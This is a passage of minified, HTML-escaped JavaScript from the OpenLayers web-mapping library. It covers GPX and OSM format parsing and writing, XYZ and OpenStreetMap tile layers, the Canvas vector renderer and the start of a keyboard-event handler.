OpenLayers.Feature.Vector(l,f))}}if(this.extractRoutes)for(e=a.getElementsByTagName("rte"),c=0,d= e.length;c&lt;d;c++)f={},this.extractAttributes&amp;&amp;(f=this.parseAttributes(e[c])),g=this.extractSegment(e[c],"rtept"),b.push(new OpenLayers.Feature.Vector(g,f));if(this.extractWaypoints)for(a=a.getElementsByTagName("wpt"),c=0,e=a.length;c&lt;e;c++)f={},this.extractAttributes&amp;&amp;(f=this.parseAttributes(a[c])),d=new OpenLayers.Geometry.Point(a[c].getAttribute("lon"),a[c].getAttribute("lat")),b.push(new OpenLayers.Feature.Vector(d,f));if(this.internalProjection&amp;&amp;this.externalProjection)for(f=0,a=b.length;f&lt;a;f++)b[f].geometry.transform(this.externalProjection, this.internalProjection);return b},extractSegment:function(a,b){for(var c=this.getElementsByTagNameNS(a,a.namespaceURI,b),d=[],e=0,f=c.length;e&lt;f;e++)d.push(new OpenLayers.Geometry.Point(c[e].getAttribute("lon"),c[e].getAttribute("lat")));return new OpenLayers.Geometry.LineString(d)},parseAttributes:function(a){var b={};a=a.firstChild;for(var c,d;a;)1==a.nodeType&amp;&amp;a.firstChild&amp;&amp;(c=a.firstChild,3==c.nodeType||4==c.nodeType)&amp;&amp;(d=a.prefix?a.nodeName.split(":")[1]:a.nodeName,"trkseg"!=d&amp;&amp;"rtept"!=d&amp;&amp; (b[d]=c.nodeValue)),a=a.nextSibling;return b},write:function(a,b){a=OpenLayers.Util.isArray(a)?a:[a];var c=this.createElementNS(this.namespaces.gpx,"gpx");c.setAttribute("version","1.1");c.setAttribute("creator",this.creator);this.setAttributes(c,{"xsi:schemaLocation":this.schemaLocation});b&amp;&amp;"object"==typeof b&amp;&amp;c.appendChild(this.buildMetadataNode(b));for(var d=0,e=a.length;d&lt;e;d++)c.appendChild(this.buildFeatureNode(a[d]));return OpenLayers.Format.XML.prototype.write.apply(this,[c])},buildMetadataNode:function(a){for(var b= ["name","desc","author"],c=this.createElementNS(this.namespaces.gpx,"metadata"),d=0;d&lt;b.length;d++){var e=b[d];if(a[e]){var f=this.createElementNS(this.namespaces.gpx,e);f.appendChild(this.createTextNode(a[e]));c.appendChild(f)}}return c},buildFeatureNode:function(a){var b=a.geometry,b=b.clone();this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;b.transform(this.internalProjection,this.externalProjection);if("OpenLayers.Geometry.Point"==b.CLASS_NAME){var c=this.buildWptNode(b);this.appendAttributesNode(c, a);return c}c=this.createElementNS(this.namespaces.gpx,"trk");this.appendAttributesNode(c,a);a=this.buildTrkSegNode(b);a=OpenLayers.Util.isArray(a)?a:[a];for(var b=0,d=a.length;b&lt;d;b++)c.appendChild(a[b]);return c},buildTrkSegNode:function(a){var b,c,d,e;if("OpenLayers.Geometry.LineString"==a.CLASS_NAME||"OpenLayers.Geometry.LinearRing"==a.CLASS_NAME){b=this.createElementNS(this.namespaces.gpx,"trkseg");c=0;for(d=a.components.length;c&lt;d;c++)e=a.components[c],b.appendChild(this.buildTrkPtNode(e)); return b}b=[];c=0;for(d=a.components.length;c&lt;d;c++)b.push(this.buildTrkSegNode(a.components[c]));return b},buildTrkPtNode:function(a){var b=this.createElementNS(this.namespaces.gpx,"trkpt");b.setAttribute("lon",a.x);b.setAttribute("lat",a.y);return b},buildWptNode:function(a){var b=this.createElementNS(this.namespaces.gpx,"wpt");b.setAttribute("lon",a.x);b.setAttribute("lat",a.y);return b},appendAttributesNode:function(a,b){var c=this.createElementNS(this.namespaces.gpx,"name");c.appendChild(this.createTextNode(b.attributes.name|| b.id));a.appendChild(c);c=this.createElementNS(this.namespaces.gpx,"desc");c.appendChild(this.createTextNode(b.attributes.description||this.defaultDesc));a.appendChild(c)},CLASS_NAME:"OpenLayers.Format.GPX"});OpenLayers.Format.WMSDescribeLayer=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.1.1",CLASS_NAME:"OpenLayers.Format.WMSDescribeLayer"});OpenLayers.Format.WMSDescribeLayer.v1_1_1=OpenLayers.Class(OpenLayers.Format.WMSDescribeLayer,{initialize:function(a){OpenLayers.Format.WMSDescribeLayer.prototype.initialize.apply(this,[a])},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));for(var b=a.documentElement.childNodes,c={layerDescriptions:[]},d,e,f=0;f&lt;b.length;++f)if(d=b[f],e=d.nodeName,"LayerDescription"==e){e=d.getAttribute("name");var g="",h="",k="";d.getAttribute("owsType")?(g=d.getAttribute("owsType"), h=d.getAttribute("owsURL")):""!=d.getAttribute("wfs")?(g="WFS",h=d.getAttribute("wfs")):""!=d.getAttribute("wcs")&amp;&amp;(g="WCS",h=d.getAttribute("wcs"));d=d.getElementsByTagName("Query");0&lt;d.length&amp;&amp;((k=d[0].getAttribute("typeName"))||(k=d[0].getAttribute("typename")));d={layerName:e,owsType:g,owsURL:h,typeName:k};c.layerDescriptions.push(d);c.length=c.layerDescriptions.length;c[c.length-1]=d}else if("ServiceException"==e)return{error:(new OpenLayers.Format.OGCExceptionReport).read(a)};return c},CLASS_NAME:"OpenLayers.Format.WMSDescribeLayer.v1_1_1"}); OpenLayers.Format.WMSDescribeLayer.v1_1_0=OpenLayers.Format.WMSDescribeLayer.v1_1_1;OpenLayers.Layer.XYZ=OpenLayers.Class(OpenLayers.Layer.Grid,{isBaseLayer:!0,sphericalMercator:!1,zoomOffset:0,serverResolutions:null,initialize:function(a,b,c){if(c&amp;&amp;c.sphericalMercator||this.sphericalMercator)c=OpenLayers.Util.extend({projection:"EPSG:900913",numZoomLevels:19},c);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a||this.name,b||this.url,{},c])},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.XYZ(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this, [a])},getURL:function(a){a=this.getXYZ(a);var b=this.url;OpenLayers.Util.isArray(b)&amp;&amp;(b=this.selectUrl(""+a.x+a.y+a.z,b));return OpenLayers.String.format(b,a)},getXYZ:function(a){var b=this.getServerResolution(),c=Math.round((a.left-this.maxExtent.left)/(b*this.tileSize.w));a=Math.round((this.maxExtent.top-a.top)/(b*this.tileSize.h));b=this.getServerZoom();if(this.wrapDateLine)var d=Math.pow(2,b),c=(c%d+d)%d;return{x:c,y:a,z:b}},setMap:function(a){OpenLayers.Layer.Grid.prototype.setMap.apply(this, arguments);this.tileOrigin||(this.tileOrigin=new OpenLayers.LonLat(this.maxExtent.left,this.maxExtent.bottom))},CLASS_NAME:"OpenLayers.Layer.XYZ"});OpenLayers.Layer.OSM=OpenLayers.Class(OpenLayers.Layer.XYZ,{name:"OpenStreetMap",url:["http://a.tile.openstreetmap.org/${z}/${x}/${y}.png","http://b.tile.openstreetmap.org/${z}/${x}/${y}.png","http://c.tile.openstreetmap.org/${z}/${x}/${y}.png"],attribution:"&amp;copy; &lt;a href='http://www.openstreetmap.org/copyright'>OpenStreetMap&lt;/a> contributors",sphericalMercator:!0,wrapDateLine:!0,tileOptions:null,initialize:function(a,b,c){OpenLayers.Layer.XYZ.prototype.initialize.apply(this,arguments);this.tileOptions= OpenLayers.Util.extend({crossOriginKeyword:"anonymous"},this.options&amp;&amp;this.options.tileOptions)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.OSM(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.XYZ.prototype.clone.apply(this,[a])},CLASS_NAME:"OpenLayers.Layer.OSM"});OpenLayers.Renderer=OpenLayers.Class({container:null,root:null,extent:null,locked:!1,size:null,resolution:null,map:null,featureDx:0,initialize:function(a,b){this.container=OpenLayers.Util.getElement(a);OpenLayers.Util.extend(this,b)},destroy:function(){this.map=this.resolution=this.size=this.extent=this.container=null},supported:function(){return!1},setExtent:function(a,b){this.extent=a.clone();if(this.map.baseLayer&amp;&amp;this.map.baseLayer.wrapDateLine){var c=a.getWidth()/this.map.getExtent().getWidth(); a=a.scale(1/c);this.extent=a.wrapDateLine(this.map.getMaxExtent()).scale(c)}b&amp;&amp;(this.resolution=null);return!0},setSize:function(a){this.size=a.clone();this.resolution=null},getResolution:function(){return this.resolution=this.resolution||this.map.getResolution()},drawFeature:function(a,b){null==b&amp;&amp;(b=a.style);if(a.geometry){var c=a.geometry.getBounds();if(c){var d;this.map.baseLayer&amp;&amp;this.map.baseLayer.wrapDateLine&amp;&amp;(d=this.map.getMaxExtent());c.intersectsBounds(this.extent,{worldBounds:d})?this.calculateFeatureDx(c, d):b={display:"none"};c=this.drawGeometry(a.geometry,b,a.id);if("none"!=b.display&amp;&amp;b.label&amp;&amp;!1!==c){d=a.geometry.getCentroid();if(b.labelXOffset||b.labelYOffset){var e=isNaN(b.labelXOffset)?0:b.labelXOffset,f=isNaN(b.labelYOffset)?0:b.labelYOffset,g=this.getResolution();d.move(e*g,f*g)}this.drawText(a.id,b,d)}else this.removeText(a.id);return c}}},calculateFeatureDx:function(a,b){this.featureDx=0;if(b){var c=b.getWidth();this.featureDx=Math.round(((a.left+a.right)/2-(this.extent.left+this.extent.right)/ 2)/c)*c}},drawGeometry:function(a,b,c){},drawText:function(a,b,c){},removeText:function(a){},clear:function(){},getFeatureIdFromEvent:function(a){},eraseFeatures:function(a){OpenLayers.Util.isArray(a)||(a=[a]);for(var b=0,c=a.length;b&lt;c;++b){var d=a[b];this.eraseGeometry(d.geometry,d.id);this.removeText(d.id)}},eraseGeometry:function(a,b){},moveRoot:function(a){},getRenderLayerId:function(){return this.container.id},applyDefaultSymbolizer:function(a){var b=OpenLayers.Util.extend({},OpenLayers.Renderer.defaultSymbolizer); !1===a.stroke&amp;&amp;(delete b.strokeWidth,delete b.strokeColor);!1===a.fill&amp;&amp;delete b.fillColor;OpenLayers.Util.extend(b,a);return b},CLASS_NAME:"OpenLayers.Renderer"});OpenLayers.Renderer.defaultSymbolizer={fillColor:"#000000",strokeColor:"#000000",strokeWidth:2,fillOpacity:1,strokeOpacity:1,pointRadius:0,labelAlign:"cm"}; OpenLayers.Renderer.symbol={star:[350,75,379,161,469,161,397,215,423,301,350,250,277,301,303,215,231,161,321,161,350,75],cross:[4,0,6,0,6,4,10,4,10,6,6,6,6,10,4,10,4,6,0,6,0,4,4,4,4,0],x:[0,0,25,0,50,35,75,0,100,0,65,50,100,100,75,100,50,65,25,100,0,100,35,50,0,0],square:[0,0,0,1,1,1,1,0,0,0],triangle:[0,10,10,10,5,0,0,10]};OpenLayers.Renderer.Canvas=OpenLayers.Class(OpenLayers.Renderer,{hitDetection:!0,hitOverflow:0,canvas:null,features:null,pendingRedraw:!1,cachedSymbolBounds:{},initialize:function(a,b){OpenLayers.Renderer.prototype.initialize.apply(this,arguments);this.root=document.createElement("canvas");this.container.appendChild(this.root);this.canvas=this.root.getContext("2d");this.features={};this.hitDetection&amp;&amp;(this.hitCanvas=document.createElement("canvas"),this.hitContext=this.hitCanvas.getContext("2d"))}, setExtent:function(){OpenLayers.Renderer.prototype.setExtent.apply(this,arguments);return!1},eraseGeometry:function(a,b){this.eraseFeatures(this.features[b][0])},supported:function(){return OpenLayers.CANVAS_SUPPORTED},setSize:function(a){this.size=a.clone();var b=this.root;b.style.width=a.w+"px";b.style.height=a.h+"px";b.width=a.w;b.height=a.h;this.resolution=null;this.hitDetection&amp;&amp;(b=this.hitCanvas,b.style.width=a.w+"px",b.style.height=a.h+"px",b.width=a.w,b.height=a.h)},drawFeature:function(a, b){var c;if(a.geometry){b=this.applyDefaultSymbolizer(b||a.style);c=a.geometry.getBounds();var d;this.map.baseLayer&amp;&amp;this.map.baseLayer.wrapDateLine&amp;&amp;(d=this.map.getMaxExtent());d=c&amp;&amp;c.intersectsBounds(this.extent,{worldBounds:d});(c="none"!==b.display&amp;&amp;!!c&amp;&amp;d)?this.features[a.id]=[a,b]:delete this.features[a.id];this.pendingRedraw=!0}this.pendingRedraw&amp;&amp;!this.locked&amp;&amp;(this.redraw(),this.pendingRedraw=!1);return c},drawGeometry:function(a,b,c){var d=a.CLASS_NAME;if("OpenLayers.Geometry.Collection"== d||"OpenLayers.Geometry.MultiPoint"==d||"OpenLayers.Geometry.MultiLineString"==d||"OpenLayers.Geometry.MultiPolygon"==d)for(d=0;d&lt;a.components.length;d++)this.drawGeometry(a.components[d],b,c);else switch(a.CLASS_NAME){case "OpenLayers.Geometry.Point":this.drawPoint(a,b,c);break;case "OpenLayers.Geometry.LineString":this.drawLineString(a,b,c);break;case "OpenLayers.Geometry.LinearRing":this.drawLinearRing(a,b,c);break;case "OpenLayers.Geometry.Polygon":this.drawPolygon(a,b,c)}},drawExternalGraphic:function(a, b,c){var d=new Image,e=b.title||b.graphicTitle;e&amp;&amp;(d.title=e);var f=b.graphicWidth||b.graphicHeight,g=b.graphicHeight||b.graphicWidth,f=f?f:2*b.pointRadius,g=g?g:2*b.pointRadius,h=void 0!=b.graphicXOffset?b.graphicXOffset:-(0.5*f),k=void 0!=b.graphicYOffset?b.graphicYOffset:-(0.5*g),l=b.graphicOpacity||b.fillOpacity;d.onload=OpenLayers.Function.bind(function(){if(this.features[c]){var b=this.getLocalXY(a),e=b[0],b=b[1];if(!isNaN(e)&amp;&amp;!isNaN(b)){var e=e+h|0,b=b+k|0,p=this.canvas;p.globalAlpha=l;var q= OpenLayers.Renderer.Canvas.drawImageScaleFactor||(OpenLayers.Renderer.Canvas.drawImageScaleFactor=/android 2.1/.test(navigator.userAgent.toLowerCase())?320/window.screen.width:1);p.drawImage(d,e*q,b*q,f*q,g*q);this.hitDetection&amp;&amp;(this.setHitContextStyle("fill",c),this.hitContext.fillRect(e,b,f,g))}}},this);d.src=b.externalGraphic},drawNamedSymbol:function(a,b,c){var d,e,f,g;f=Math.PI/180;var h=OpenLayers.Renderer.symbol[b.graphicName];if(!h)throw Error(b.graphicName+" is not a valid symbol name"); if(!(!h.length||2>h.length||(a=this.getLocalXY(a),e=a[0],g=a[1],isNaN(e)||isNaN(g)))){this.canvas.lineCap="round";this.canvas.lineJoin="round";this.hitDetection&amp;&amp;(this.hitContext.lineCap="round",this.hitContext.lineJoin="round");if(b.graphicName in this.cachedSymbolBounds)d=this.cachedSymbolBounds[b.graphicName];else{d=new OpenLayers.Bounds;for(a=0;a&lt;h.length;a+=2)d.extend(new OpenLayers.LonLat(h[a],h[a+1]));this.cachedSymbolBounds[b.graphicName]=d}this.canvas.save();this.hitDetection&amp;&amp;this.hitContext.save(); this.canvas.translate(e,g);this.hitDetection&amp;&amp;this.hitContext.translate(e,g);a=f*b.rotation;isNaN(a)||(this.canvas.rotate(a),this.hitDetection&amp;&amp;this.hitContext.rotate(a));f=2*b.pointRadius/Math.max(d.getWidth(),d.getHeight());this.canvas.scale(f,f);this.hitDetection&amp;&amp;this.hitContext.scale(f,f);a=d.getCenterLonLat().lon;d=d.getCenterLonLat().lat;this.canvas.translate(-a,-d);this.hitDetection&amp;&amp;this.hitContext.translate(-a,-d);g=b.strokeWidth;b.strokeWidth=g/f;if(!1!==b.fill){this.setCanvasStyle("fill", b);this.canvas.beginPath();for(a=0;a&lt;h.length;a+=2)d=h[a],e=h[a+1],0==a&amp;&amp;this.canvas.moveTo(d,e),this.canvas.lineTo(d,e);this.canvas.closePath();this.canvas.fill();if(this.hitDetection){this.setHitContextStyle("fill",c,b);this.hitContext.beginPath();for(a=0;a&lt;h.length;a+=2)d=h[a],e=h[a+1],0==a&amp;&amp;this.canvas.moveTo(d,e),this.hitContext.lineTo(d,e);this.hitContext.closePath();this.hitContext.fill()}}if(!1!==b.stroke){this.setCanvasStyle("stroke",b);this.canvas.beginPath();for(a=0;a&lt;h.length;a+=2)d=h[a], e=h[a+1],0==a&amp;&amp;this.canvas.moveTo(d,e),this.canvas.lineTo(d,e);this.canvas.closePath();this.canvas.stroke();if(this.hitDetection){this.setHitContextStyle("stroke",c,b,f);this.hitContext.beginPath();for(a=0;a&lt;h.length;a+=2)d=h[a],e=h[a+1],0==a&amp;&amp;this.hitContext.moveTo(d,e),this.hitContext.lineTo(d,e);this.hitContext.closePath();this.hitContext.stroke()}}b.strokeWidth=g;this.canvas.restore();this.hitDetection&amp;&amp;this.hitContext.restore();this.setCanvasStyle("reset")}},setCanvasStyle:function(a,b){"fill"=== a?(this.canvas.globalAlpha=b.fillOpacity,this.canvas.fillStyle=b.fillColor):"stroke"===a?(this.canvas.globalAlpha=b.strokeOpacity,this.canvas.strokeStyle=b.strokeColor,this.canvas.lineWidth=b.strokeWidth):(this.canvas.globalAlpha=0,this.canvas.lineWidth=1)},featureIdToHex:function(a){a=Number(a.split("_").pop())+1;16777216&lt;=a&amp;&amp;(this.hitOverflow=a-16777215,a=a%16777216+1);a="000000"+a.toString(16);var b=a.length;return a="#"+a.substring(b-6,b)},setHitContextStyle:function(a,b,c,d){b=this.featureIdToHex(b); "fill"==a?(this.hitContext.globalAlpha=1,this.hitContext.fillStyle=b):"stroke"==a?(this.hitContext.globalAlpha=1,this.hitContext.strokeStyle=b,"undefined"===typeof d?this.hitContext.lineWidth=c.strokeWidth+2:isNaN(d)||(this.hitContext.lineWidth=c.strokeWidth+2/d)):(this.hitContext.globalAlpha=0,this.hitContext.lineWidth=1)},drawPoint:function(a,b,c){if(!1!==b.graphic)if(b.externalGraphic)this.drawExternalGraphic(a,b,c);else if(b.graphicName&amp;&amp;"circle"!=b.graphicName)this.drawNamedSymbol(a,b,c);else{var d= this.getLocalXY(a);a=d[0];d=d[1];if(!isNaN(a)&amp;&amp;!isNaN(d)){var e=2*Math.PI,f=b.pointRadius;!1!==b.fill&amp;&amp;(this.setCanvasStyle("fill",b),this.canvas.beginPath(),this.canvas.arc(a,d,f,0,e,!0),this.canvas.fill(),this.hitDetection&amp;&amp;(this.setHitContextStyle("fill",c,b),this.hitContext.beginPath(),this.hitContext.arc(a,d,f,0,e,!0),this.hitContext.fill()));!1!==b.stroke&amp;&amp;(this.setCanvasStyle("stroke",b),this.canvas.beginPath(),this.canvas.arc(a,d,f,0,e,!0),this.canvas.stroke(),this.hitDetection&amp;&amp;(this.setHitContextStyle("stroke", c,b),this.hitContext.beginPath(),this.hitContext.arc(a,d,f,0,e,!0),this.hitContext.stroke()),this.setCanvasStyle("reset"))}}},drawLineString:function(a,b,c){b=OpenLayers.Util.applyDefaults({fill:!1},b);this.drawLinearRing(a,b,c)},drawLinearRing:function(a,b,c){!1!==b.fill&amp;&amp;(this.setCanvasStyle("fill",b),this.renderPath(this.canvas,a,b,c,"fill"),this.hitDetection&amp;&amp;(this.setHitContextStyle("fill",c,b),this.renderPath(this.hitContext,a,b,c,"fill")));!1!==b.stroke&amp;&amp;(this.setCanvasStyle("stroke",b),this.renderPath(this.canvas, a,b,c,"stroke"),this.hitDetection&amp;&amp;(this.setHitContextStyle("stroke",c,b),this.renderPath(this.hitContext,a,b,c,"stroke")));this.setCanvasStyle("reset")},renderPath:function(a,b,c,d,e){b=b.components;c=b.length;a.beginPath();d=this.getLocalXY(b[0]);var f=d[1];if(!isNaN(d[0])&amp;&amp;!isNaN(f)){a.moveTo(d[0],d[1]);for(d=1;d&lt;c;++d)f=this.getLocalXY(b[d]),a.lineTo(f[0],f[1]);"fill"===e?a.fill():a.stroke()}},drawPolygon:function(a,b,c){a=a.components;var d=a.length;this.drawLinearRing(a[0],b,c);for(var e=1;e&lt; d;++e)this.canvas.globalCompositeOperation="destination-out",this.hitDetection&amp;&amp;(this.hitContext.globalCompositeOperation="destination-out"),this.drawLinearRing(a[e],OpenLayers.Util.applyDefaults({stroke:!1,fillOpacity:1},b),c),this.canvas.globalCompositeOperation="source-over",this.hitDetection&amp;&amp;(this.hitContext.globalCompositeOperation="source-over"),this.drawLinearRing(a[e],OpenLayers.Util.applyDefaults({fill:!1},b),c)},drawText:function(a,b){var c=this.getLocalXY(a);this.setCanvasStyle("reset"); this.canvas.fillStyle=b.fontColor;this.canvas.globalAlpha=b.fontOpacity||1;var d=[b.fontStyle?b.fontStyle:"normal","normal",b.fontWeight?b.fontWeight:"normal",b.fontSize?b.fontSize:"1em",b.fontFamily?b.fontFamily:"sans-serif"].join(" "),e=b.label.split("\n"),f=e.length;if(this.canvas.fillText){this.canvas.font=d;this.canvas.textAlign=OpenLayers.Renderer.Canvas.LABEL_ALIGN[b.labelAlign[0]]||"center";this.canvas.textBaseline=OpenLayers.Renderer.Canvas.LABEL_ALIGN[b.labelAlign[1]]||"middle";var g=OpenLayers.Renderer.Canvas.LABEL_FACTOR[b.labelAlign[1]]; null==g&amp;&amp;(g=-0.5);d=this.canvas.measureText("Mg").height||this.canvas.measureText("xx").width;c[1]+=d*g*(f-1);for(g=0;g&lt;f;g++)b.labelOutlineWidth&amp;&amp;(this.canvas.save(),this.canvas.globalAlpha=b.labelOutlineOpacity||b.fontOpacity||1,this.canvas.strokeStyle=b.labelOutlineColor,this.canvas.lineWidth=b.labelOutlineWidth,this.canvas.strokeText(e[g],c[0],c[1]+d*g+1),this.canvas.restore()),this.canvas.fillText(e[g],c[0],c[1]+d*g)}else if(this.canvas.mozDrawText){this.canvas.mozTextStyle=d;var h=OpenLayers.Renderer.Canvas.LABEL_FACTOR[b.labelAlign[0]]; null==h&amp;&amp;(h=-0.5);g=OpenLayers.Renderer.Canvas.LABEL_FACTOR[b.labelAlign[1]];null==g&amp;&amp;(g=-0.5);d=this.canvas.mozMeasureText("xx");c[1]+=d*(1+g*f);for(g=0;g&lt;f;g++){var k=c[0]+h*this.canvas.mozMeasureText(e[g]),l=c[1]+g*d;this.canvas.translate(k,l);this.canvas.mozDrawText(e[g]);this.canvas.translate(-k,-l)}}this.setCanvasStyle("reset")},getLocalXY:function(a){var b=this.getResolution(),c=this.extent;return[(a.x-this.featureDx)/b+-c.left/b,c.top/b-a.y/b]},clear:function(){var a=this.root.height,b=this.root.width; this.canvas.clearRect(0,0,b,a);this.features={};this.hitDetection&amp;&amp;this.hitContext.clearRect(0,0,b,a)},getFeatureIdFromEvent:function(a){var b;if(this.hitDetection&amp;&amp;"none"!==this.root.style.display&amp;&amp;!this.map.dragging&amp;&amp;(a=a.xy,a=this.hitContext.getImageData(a.x|0,a.y|0,1,1).data,255===a[3]&amp;&amp;(a=a[2]+256*(a[1]+256*a[0])))){a="OpenLayers_Feature_Vector_"+(a-1+this.hitOverflow);try{b=this.features[a][0]}catch(c){}}return b},eraseFeatures:function(a){OpenLayers.Util.isArray(a)||(a=[a]);for(var b=0;b&lt;a.length;++b)delete this.features[a[b].id]; this.redraw()},redraw:function(){if(!this.locked){var a=this.root.height,b=this.root.width;this.canvas.clearRect(0,0,b,a);this.hitDetection&amp;&amp;this.hitContext.clearRect(0,0,b,a);var a=[],c,d,e=this.map.baseLayer&amp;&amp;this.map.baseLayer.wrapDateLine&amp;&amp;this.map.getMaxExtent(),f;for(f in this.features)this.features.hasOwnProperty(f)&amp;&amp;(b=this.features[f][0],c=b.geometry,this.calculateFeatureDx(c.getBounds(),e),d=this.features[f][1],this.drawGeometry(c,d,b.id),d.label&amp;&amp;a.push([b,d]));b=0;for(c=a.length;b&lt;c;++b)f= a[b],this.drawText(f[0].geometry.getCentroid(),f[1])}},CLASS_NAME:"OpenLayers.Renderer.Canvas"});OpenLayers.Renderer.Canvas.LABEL_ALIGN={l:"left",r:"right",t:"top",b:"bottom"};OpenLayers.Renderer.Canvas.LABEL_FACTOR={l:0,r:-1,t:0,b:-1};OpenLayers.Renderer.Canvas.drawImageScaleFactor=null;OpenLayers.Format.OSM=OpenLayers.Class(OpenLayers.Format.XML,{checkTags:!1,interestingTagsExclude:null,areaTags:null,initialize:function(a){var b={interestingTagsExclude:"source source_ref source:ref history attribution created_by".split(" "),areaTags:"area building leisure tourism ruins historic landuse military natural sport".split(" ")},b=OpenLayers.Util.extend(b,a),c={};for(a=0;a&lt;b.interestingTagsExclude.length;a++)c[b.interestingTagsExclude[a]]=!0;b.interestingTagsExclude=c;c={};for(a=0;a&lt;b.areaTags.length;a++)c[b.areaTags[a]]= !0;b.areaTags=c;this.externalProjection=new OpenLayers.Projection("EPSG:4326");OpenLayers.Format.XML.prototype.initialize.apply(this,[b])},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=this.getNodes(a),c=this.getWays(a);a=Array(c.length);for(var d=0;d&lt;c.length;d++){for(var e=Array(c[d].nodes.length),f=this.isWayArea(c[d])?1:0,g=0;g&lt;c[d].nodes.length;g++){var h=b[c[d].nodes[g]],k=new OpenLayers.Geometry.Point(h.lon,h.lat);k.osm_id=parseInt(c[d].nodes[g]); e[g]=k;h.used=!0}h=null;h=f?new OpenLayers.Geometry.Polygon(new OpenLayers.Geometry.LinearRing(e)):new OpenLayers.Geometry.LineString(e);this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;h.transform(this.externalProjection,this.internalProjection);e=new OpenLayers.Feature.Vector(h,c[d].tags);e.osm_id=parseInt(c[d].id);e.fid="way."+e.osm_id;a[d]=e}for(var l in b){h=b[l];if(!h.used||this.checkTags){c=null;if(this.checkTags){c=this.getTags(h.node,!0);if(h.used&amp;&amp;!c[1])continue;c=c[0]}else c=this.getTags(h.node); e=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(h.lon,h.lat),c);this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;e.geometry.transform(this.externalProjection,this.internalProjection);e.osm_id=parseInt(l);e.fid="node."+e.osm_id;a.push(e)}h.node=null}return a},getNodes:function(a){a=a.getElementsByTagName("node");for(var b={},c=0;c&lt;a.length;c++){var d=a[c],e=d.getAttribute("id");b[e]={lat:d.getAttribute("lat"),lon:d.getAttribute("lon"),node:d}}return b},getWays:function(a){a=a.getElementsByTagName("way"); for(var b=[],c=0;c&lt;a.length;c++){var d=a[c],e={id:d.getAttribute("id")};e.tags=this.getTags(d);d=d.getElementsByTagName("nd");e.nodes=Array(d.length);for(var f=0;f&lt;d.length;f++)e.nodes[f]=d[f].getAttribute("ref");b.push(e)}return b},getTags:function(a,b){for(var c=a.getElementsByTagName("tag"),d={},e=!1,f=0;f&lt;c.length;f++){var g=c[f].getAttribute("k");d[g]=c[f].getAttribute("v");b&amp;&amp;(this.interestingTagsExclude[g]||(e=!0))}return b?[d,e]:d},isWayArea:function(a){var b=!1,c=!1;a.nodes[0]==a.nodes[a.nodes.length- 1]&amp;&amp;(b=!0);if(this.checkTags)for(var d in a.tags)if(this.areaTags[d]){c=!0;break}return b&amp;&amp;(this.checkTags?c:!0)},write:function(a){OpenLayers.Util.isArray(a)||(a=[a]);this.osm_id=1;this.created_nodes={};var b=this.createElementNS(null,"osm");b.setAttribute("version","0.5");b.setAttribute("generator","OpenLayers "+OpenLayers.VERSION_NUMBER);for(var c=a.length-1;0&lt;=c;c--)for(var d=this.createFeatureNodes(a[c]),e=0;e&lt;d.length;e++)b.appendChild(d[e]);return OpenLayers.Format.XML.prototype.write.apply(this, [b])},createFeatureNodes:function(a){var b=[],c=a.geometry.CLASS_NAME,c=c.substring(c.lastIndexOf(".")+1),c=c.toLowerCase();(c=this.createXML[c])&amp;&amp;(b=c.apply(this,[a]));return b},createXML:{point:function(a){var b=null,c=a.geometry?a.geometry:a;this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;(c=c.clone(),c.transform(this.internalProjection,this.externalProjection));var d=!1;a.osm_id?(b=a.osm_id,this.created_nodes[b]&amp;&amp;(d=!0)):(b=-this.osm_id,this.osm_id++);var e=d?this.created_nodes[b]:this.createElementNS(null, "node");this.created_nodes[b]=e;e.setAttribute("id",b);e.setAttribute("lon",c.x);e.setAttribute("lat",c.y);a.attributes&amp;&amp;this.serializeTags(a,e);this.setState(a,e);return d?[]:[e]},linestring:function(a){var b,c=[],d=a.geometry;a.osm_id?b=a.osm_id:(b=-this.osm_id,this.osm_id++);var e=this.createElementNS(null,"way");e.setAttribute("id",b);for(b=0;b&lt;d.components.length;b++){var f=this.createXML.point.apply(this,[d.components[b]]);if(f.length){var f=f[0],g=f.getAttribute("id");c.push(f)}else g=d.components[b].osm_id, f=this.created_nodes[g];this.setState(a,f);f=this.createElementNS(null,"nd");f.setAttribute("ref",g);e.appendChild(f)}this.serializeTags(a,e);c.push(e);return c},polygon:function(a){var b=OpenLayers.Util.extend({area:"yes"},a.attributes),b=new OpenLayers.Feature.Vector(a.geometry.components[0],b);b.osm_id=a.osm_id;return this.createXML.linestring.apply(this,[b])}},serializeTags:function(a,b){for(var c in a.attributes){var d=this.createElementNS(null,"tag");d.setAttribute("k",c);d.setAttribute("v", a.attributes[c]);b.appendChild(d)}},setState:function(a,b){if(a.state){var c=null;switch(a.state){case OpenLayers.State.UPDATE:case OpenLayers.State.DELETE:c="delete"}c&amp;&amp;b.setAttribute("action",c)}},CLASS_NAME:"OpenLayers.Format.OSM"});OpenLayers.Handler.Keyboard=OpenLayers.Class(OpenLayers.Handler,{KEY_EVENTS:["keydown","keyup"],eventListener:null,observeElement:null,initialize:function(a,b,c){OpenLayers.Handler.prototype.initialize.apply(this,arguments);this.eventListener=OpenLayers.Function.bindAsEventListener(this.handleKeyEvent,this)},destroy:function(){this.deactivate();this.eventListener=null;OpenLayers.Handler.prototype.destroy.apply(this,arguments)},activate:function(){if(OpenLayers.Handler.prototype.activate.apply(this, arguments)){this.observeElement=this.observeElement||document;for(var a=0,b=this.KEY_EVENTS.length;a&lt;b;a++)OpenLayers.Event.observe(this.observeElement,this.KEY_EVENTS[a],this.eventListener);return!0}return!1},deactivate:function(){var a=!1;if(OpenLayers.Handler.prototype.deactivate.apply(this,arguments)){for(var a=0,b=this.KEY_EVENTS.length;a&lt;b;a++)OpenLayers.Event.stopObserving(this.observeElement,this.KEY_EVENTS[a],this.eventListener);a=!0}return a},handleKeyEvent:function(a){this.checkModifiers(a)&amp;&amp; 